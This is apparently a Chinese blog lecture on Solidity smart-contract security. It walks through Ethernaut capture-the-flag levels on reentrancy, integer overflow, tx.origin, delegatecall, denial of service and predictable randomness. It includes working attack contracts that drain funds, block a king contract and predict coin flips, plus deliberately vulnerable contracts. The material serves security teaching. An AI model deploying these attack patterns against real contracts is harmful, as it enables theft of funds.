<li><a href="https://link.zhihu.com/?target=http://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/">http://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/</a></li>
<li><a href="https://link.zhihu.com/?target=http://vessenes.com/deconstructing-thedao-attack-a-brief-code-tour/">http://vessenes.com/deconstructing-thedao-attack-a-brief-code-tour/</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011721501/article/details/79450122">https://blog.csdn.net/u011721501/article/details/79450122</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2019/04/07/dao/">https://learnblockchain.cn/2019/04/07/dao/</a></li>
<li><a href="https://link.zhihu.com/?target=http://eips.ethereum.org/EIPS/eip-779">EIP 779: Hardfork Meta: DAO Fork</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.slock.it/hard-fork-specification-24b889e70703">Hard Fork Specification</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/ethereum/go-ethereum/pull/2814">PR#2814-finalize the DAO fork</a></li>
<li><a href="https://link.zhihu.com/?target=http://chainb.com/?P=Cont&id=1290">http://chainb.com/?P=Cont&id=1290</a></li>
</ol>
<h1 id="区块链技术13-区块链安全-2"><a href="#区块链技术13-区块链安全-2" class="headerlink" title="区块链技术13:区块链安全(2)"></a>区块链技术13:区块链安全(2)</h1><p>接下来我们继续看一看以太坊中常见的代码编写的安全问题。下面列出了已知的常见的 Solidity 的漏洞类型：</p>
<ol>
<li>Reentrancy - 重入</li>
<li>Access Control - 访问控制</li>
<li>Arithmetic Issues - 算术问题（整数上下溢出）</li>
<li>Unchecked Return Values For Low Level Calls - 未严格判断不安全函数调用返回值</li>
<li>Denial of Service - 拒绝服务</li>
<li>Bad Randomness - 可预测的随机处理</li>
<li>Front Running</li>
<li>Time manipulation</li>
<li>Short Address Attack - 短地址攻击</li>
<li>Unknown Unknowns - 其他未知</li>
</ol>
<p>为了让本节更有趣，这次课我们尝试使用在线的<a href="https://link.zhihu.com/?target=http://remix.ethereum.org/">remix</a>结合ethernaut看一下上次课的攻击效果。Remix IDE是开发以太坊智能合约的在线IDE工具，部署简单的智能合约非常方便。需要使用谷歌或者火狐的浏览器，且安装了MetaMask 插件。</p>
<p>Ethernaut 是 Zeppelin 提供的一个基于 Web3 和 Solidity 的智能合约审计训练平台，复现了智能合约中可能出现的各种安全问题。现在已经有20+题目。</p>
<ol>
<li>首先，我们直接来看问题10，reentrancy重入问题。这个问题和我们上次讲的问题很像。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233094.jpg" alt="img"></p>
<p>首先来复习一下这个代码的问题，以及如何可以利用这个漏洞。</p>
<p>有了基本思路之后，可以撰写代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      if(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = 0x476a5eebd3587e89d1f4f81b1fa7a724f834a04c;</span><br><span class="line">    Reentrance target = Reentrance(instance_address);</span><br><span class="line"></span><br><span class="line">    function Attack() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function donate() public payable &#123;</span><br><span class="line">        target.donate.value(msg.value)(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.withdraw(0.5 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_balance() public view returns(uint) &#123;</span><br><span class="line">        return target.balanceOf(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function my_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ins_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        return instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        target.withdraw(0.5 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把以上代码拷贝到remix ide中，编译之后将合约部署到网络上，此时查看，可以看到</p>
<ul>
<li>balance 为 0</li>
<li><code>Reentrance</code> 账户余额 1 ether</li>
<li><code>Attack</code> 账户余额 0 ether</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233095.jpg" alt="img"></p>
<p>然后调用donate函数，以攻击者合约的身份向题目地址转账 1 ether；首先在value处填写1 ether；</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233096.jpg" alt="img"></p>
<p>然后调用donate函数：</p>
<ul>
<li>balance 为 1</li>
<li><code>Reentrance</code> 账户余额 2 ether</li>
<li><code>Attack</code> 账户余额 0 ether</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233097.jpg" alt="img"></p>
<p>然后开始攻击，调用hack():</p>
<p>效果如下：</p>
<ul>
<li>balance 下溢</li>
<li>Reentrance 账户余额 0 ether</li>
<li>Attack 账户余额 2 ether</li>
</ul>
<p>一般来说，在调用hack的时候会报出不能正确估计gas的问题，尽量多给它一些gas。</p>
<p>如果gas不足，会报错。奇怪的是，居然出现了这种状况：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233098.jpg" alt="img"></p>
<p>如果hack正常工作，那么结果如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233099.jpg" alt="img"></p>
<p>\2. 为了巩固对上一个漏洞的理解，我们来接着看第一关，Fallback。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line"></span><br><span class="line">  function Fallback() public &#123;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() payable public &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关中，直接给出了源码，然后要求的通关条件是</p>
<ul>
<li>成为合约的 owner</li>
<li>清零 balance</li>
</ul>
<p>合约构造函数 <code>Fallback()</code> 中初始化拥有者贡献度为 1000 ether。<br>我们可以通过转钱提升贡献度，当贡献度超过 1000 ether 即可成为合约 owner。<br>但在 <code>contribute()</code> 中限制了每次只能转小于 0.001 ether 的钱。很明显，此路不通。</p>
<p>那请问应该如何通关呢？</p>
<p>然而成为 owner 还有另一种方式，注意到合约的 fallback 函数，即最下的无名函数。当合约账户收到一笔转账时会自动调用 fallback 函数。在这里，只要转账金额大于0，并且贡献大于0，即可成为 owner。</p>
<p>调用 <code>help()</code> 函数，了解下如何进行转钱操作。还需要注意一下 Wei 和 Ether 的转换。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract.contribute(&#123;value: 1&#125;)</span><br><span class="line">contract.sendTransaction(&#123;value: 1&#125;)</span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>

<p>这里有另一个问题，如何调用fallback。可以使用instance.sendTransaction({})的方法来触发fallback函数。</p>
<p>\3. 这里继续加深对第一个重入问题的理解，在最后一步hack成功之后，自己账户余额是一个很大的数值。这是怎么回事呢？</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">2**256   = 115792089237316195423570985008687907853269984665640564039457584007913129639936L</span><br></pre></td></tr></table></figure>

<p>这里就涉及到整数的上溢和下溢。</p>
<p>以太坊虚拟机（EVM）为整数指定固定大小的数据类型。这意味着一个整形变量只能表达一定范围的数字。例如，uint8，只能存储[0,255]之间的数字，如果想存储256，那么就会上溢，从而将变量的值变为0。相对应的，如果从一个uint8类型的值为0的变量中减1，就会发生下溢，该变量会变成255。如果不加注意，而且有没有对用户输入执行检查，就有可能发生攻击。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract TimeLock &#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">        lockTime[msg.sender] = now + 1 weeks;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseLockTime(uint _secondsToIncrease) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _secondsToIncrease;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; 0);</span><br><span class="line">        require(now &gt; lockTime[msg.sender]);</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">        msg.sender.transfer(balances[msg.sender]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这份合约的设计就像是一个时间保险库，用户可以将 Ether 存入合约，并在那里锁定至少一周。而且通过使用increaseLockTime函数，用户可以延长超过1周的时间，但是一旦存放，用户可以确信他们的 Ether 会被安全锁定至少一周。</p>
<p>上述代码有什么问题呢？（lockTime的时间是uint类型）</p>
<p>那我们来看ethernaut的第5关。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  function Token(uint _initialSupply) &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public constant returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，可以利用溢出。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233100.jpg" alt="img"></p>
<p>\4. 看完前面几个问题之后，继续看一下其他方面的问题。</p>
<p>第四关telephone。</p>
<p><code>tx.origin</code>是一个address类型，表示交易的发送者，<code>msg.sender</code>则表示为消息的发送者。在同一个合约中，它们是等价的。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233101.jpg" alt="img"></p>
<p>但是在不同合约中，<code>tx.origin</code>表示用户地址，<code>msg.sender</code>则表示合约地址。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Demo2&#123;</span><br><span class="line">    Demo demo222;</span><br><span class="line">    function Demo2(address aimAddr) &#123;</span><br><span class="line">        demo222 = Demo(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    function exp()&#123;</span><br><span class="line">        demo222.a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233102.jpg" alt="img"></p>
<p>这里的0x2b9….69ae就是合约部署之后的地址。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233103.jpg" alt="img"></p>
<p>\5. Access Control 访问控制</p>
<p>访问控制，在使用 Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：private, public, external 和 internal，对合约实例方法来讲，默认可见状态为 public，而合约实例变量的默认可见状态为 private。</p>
<ul>
<li>public 标记函数或变量可以被任何账户调用或获取，可以是合约里的函数、外部用户或继承该合约里的函数</li>
<li>external 标记的函数只能从外部访问，不能被合约里的函数直接调用，但可以使用 this.func() 外部调用的方式调用该函数</li>
<li>private 标记的函数或变量只能在本合约中使用（注：这里的限制只是在代码层面，以太坊是公链，任何人都能直接从链上获取合约的状态信息）</li>
<li>internal 一般用在合约继承中，父合约中被标记成 internal 状态变量或函数可供子合约进行直接访问和调用（外部无法直接获取和调用）</li>
</ul>
<p>Solidity 中除了常规的变量和函数可见性描述外，这里还需要特别提到的就是两种底层调用方式 <code>call</code>和 <code>delegatecall</code>：</p>
<ul>
<li><code>call</code> 的外部调用上下文是外部合约</li>
<li><code>delegatecall</code> 的外部调用上下文是调用合约上下文</li>
</ul>
<p>DELEGATECALL基本就是说“我是一个合约，我授权（delegating）你对我的storage做任何事情”。delegatecall的安全问题是它必须要能够信任接收方的合约会善待它的storage。DELEGATECALL是对CALLCODE的改进，因为CALLCODE不保存msg.send和msg.value。譬如如果A调用B，B又DELEGATECALL给C，那么在DELEGATECALL中的msg.sender是A，而在CALLCODE中的msg.sender是B。</p>
<p>如果A使用CALL调用B，那么B的代码的运行上下文就是B；如果A使用DELEGATECALL调用B，那么B的代码的运行上下文是A的上下文。简单的用图表示就是：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233104.jpg" alt="img"></p>
<p>有了这些背景知识，我们来看一下Ethernaut中的题目，第六关delegation。过关要求是要成为合约实例的owner。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function Delegate(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">    function pwn() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    function Delegation(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function () &#123;</span><br><span class="line">        if (delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路其实是很清晰，因为<code>Delegation</code>合约中的<code>delegatecall</code>函数参数可控，导致可以在合约内部执行任意函数，只需调用<code>Delegate</code>合约中的<code>pwn</code>函数，即可将 owner 变成自己。这里需要注意的问题是，delegatecall的参数问题。不是直接把函数名字传递过去。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233105.jpg" alt="img"></p>
<p>原因是，这里需要知道**Ethereum Virtual Machine(EVM)**如何确定执行合约的哪个函数。合约最后都会被编译成bytecode，而发起一个transaction要执行合约里的某个函数时，交易里的data字段同样也是bytecode而不是人看得懂的函数名称。 以一个简单的合约为例：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract Multiply &#123;</span><br><span class="line"></span><br><span class="line">   function multiply(int x, int y) constant returns(int) &#123;</span><br><span class="line"></span><br><span class="line">       return x*y; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译完的bytecode：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">6060604052341561000c57fe5b5b60ae8061001b6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633c4308a814603a575bfe5b3415604157fe5b605e60048080359060200190919080359060200190919050506074565b6040518082815260200191505060405180910390f35b600081830290505b929150505600a165627a7a72305820c40f61d36a3a1b7064b58c57c89d5c3d7c73b9116230f9948806b11836d2960c0029</span><br></pre></td></tr></table></figure>

<p>如果要执行multiply函数，算出8*7等于多少，transaction里的data字段会是</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x3c4308a800000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000007</span><br></pre></td></tr></table></figure>

<p>分成三个部分： 第一个是四个byte的3c4308a8，第二和第三个分别是32 byte长的参数，8和7。</p>
<p><strong>3c4308a8</strong>是multiply函式的 <strong>signature</strong>，是取函数名称和参数类型进行哈希后取前四个byte而得（不包含 <code>0x</code> ）：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sha3(&quot;multiply(int256,int256)&quot;));</span><br><span class="line">//0x3c4308a8851ef99b4bfa5ffd64b68e5f2b4307725b25ad0d14040bdb81e3bafcsha3(&quot;multiply(int256,int256)&quot;)).substr(2,8);</span><br><span class="line">//3c4308a8</span><br></pre></td></tr></table></figure>

<p>EVM就是靠函式的signature来知道该执行哪个函式的。在合约编译完的bytecode里搜寻也能找到此signature。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233106.jpg" alt="img"></p>
<p>\6. DoS拒绝服务攻击</p>
<p>拒绝服务攻击。</p>
<p>这里参看Ethernaut的第九关，king。</p>
<p>合约代码逻辑很简单，谁给的钱多谁就能成为 King，并且将前任 King 付的钱归还。当提交 instance 时，题目会重新夺回 King 的位置，需要解题者阻止其他人成为 King。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233107.jpg" alt="img"></p>
<p>然后提交一些币。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233108.jpg" alt="img"></p>
<p>回顾一下 Solidity 中几种转币方式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.transfer()</span><br></pre></td></tr></table></figure>

<ul>
<li>当发送失败时会 <code>throw;</code> 回滚状态</li>
<li>只会传递部分 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.send()</span><br></pre></td></tr></table></figure>

<ul>
<li>当发送失败时会返回 false</li>
<li>只会传递部分 Gas 供调用，防止重入（reentrancy）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.call.value()()</span><br></pre></td></tr></table></figure>

<ul>
<li>当发送失败时会返回 false</li>
<li>传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）</li>
</ul>
<p>当我们成为 King 之后，如果有人出价比我们高，会首先把钱退回给我们，使用的是 <code>transfer()</code>。上面提到，当 <code>transfer()</code> 调用失败时会回滚状态，那么如果合约在退钱这一步骤一直调用失败的话，代码将无法继续向下运行，其他人就无法成为新的 King。</p>
<p>部署一个新的合约，当收到转账时主动抛出错误。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line"></span><br><span class="line">    function Attack() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        instance_address.call.value(1.1 ether)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>\7. Bad Randomness - 可预测的随机处理</p>
<p>伪随机问题一直都存在于现代计算机系统中，但是在开放的区块链中，像在以太坊智能合约中编写的基于随机数的处理逻辑感觉就有点不切实际了，由于人人都能访问链上数据，合约中的存储数据都能在链上查询分析得到。如果合约代码没有严格考虑到链上数据公开的问题去使用随机数，可能会被攻击者恶意利用来进行 “作弊”。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通关条件</p>
<ul>
<li>连续猜对 10 次</li>
</ul>
<p><code>FACTOR</code> 为 2^255，<code>coinFlip</code> 结果只会为 1 或 0<br>相当于一个猜硬币正反面的游戏</p>
<p>这是经典的区块链伪随机数的问题。<br>在以太坊智能合约中编写的基于随机数的处理逻辑是十分危险的，因为区块链上的数据是公开的，所有人都可以看见，利用公开的数据来生成随机数是不明智的。<br>此外，像 <code>timestamps</code> 这样矿工可控的数据也不宜作为种子。</p>
<p>在这道题中，出题人利用 <code>block.blockhash(block.number-1)</code> 来生成随机数，这是可预测的。我们可以部署一个新的合约，先进行随机数的预测，再进行竞猜。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  CoinFlip fliphack;</span><br><span class="line">  address instance_address = instance_address_here;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function Attack() &#123;</span><br><span class="line">    fliphack = CoinFlip(instance_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function predict() public view returns (bool)&#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    return coinFlip == 1 ? true : false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    bool guess = predict();</span><br><span class="line">    fliphack.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需调用 10 次 <code>hack()</code> 函数即可。</p>
<p>P.S.</p>
<ol>
<li>遇上了meatamask 无限转圈的问题，最后发现是版本问题，下载一个老版本就行。但是extension store没有老版本，后来还是github上发现，在chrome:&#x2F;&#x2F;extensions右上角打开开发者模式，然后可以选择文件夹。</li>
</ol>
<p><strong>参考：</strong></p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://blog.sigmaprime.io/solidity-security.html">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md">https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/TurkeyCock/article/details/80485391">以太坊交易源码分析 - 鑫鑫点灯 - CSDN博客</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/148341">https://www.anquanke.com/post/id/148341</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.colabug.com/4089704.html">Ethernaut Lvl 0 Walkthrough: ABIs, Web3, and how to abuse them</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/ajian1984/articles/32320">干货 | Solidity 安全：已知攻击方法和常见防御模式综合列表，Part-1：可重入漏洞、算法上下溢出</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/632/">Solidity 安全：已知攻击方法和常见防御模式综合列表</a></li>
<li><a href="https://link.zhihu.com/?target=http://www.cnblogs.com/iamstudy/articles/ethernaut_game_wp_1.html">智能合约 - Ethernaut Game（上）</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/trufflesuite/truffle-contract%23sending-ether--triggering-the-fallback-function">trufflesuite&#x2F;truffle-contract</a></li>
<li><a href="https://link.zhihu.com/?target=http://orchome.com/966">以太坊ABI介绍 - OrcHome</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2018/08/09/understand-abi/">如何理解以太坊ABI - 应用程序二进制接口</a></li>
<li><a href="https://link.zhihu.com/?target=http://remix.ethereum.org/%23optimize=true&version=soljson-v0.4.25+commit.59dbf8f1.js">http://remix.ethereum.org/#optimize=true&version=soljson-v0.4.25+commit.59dbf8f1.js</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/304b99bfef3d">metamask 无限转圈 loading</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/601/">以太坊智能合约安全入门了解一下（上）</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/607/">以太坊智能合约安全入门了解一下（下）</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall">Difference between CALL, CALLCODE and DELEGATECALL</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/how-to-build-updateable-smart-contract-part-1">教程 | 在区块链上建立可更新的智慧合约(一)</a></li>
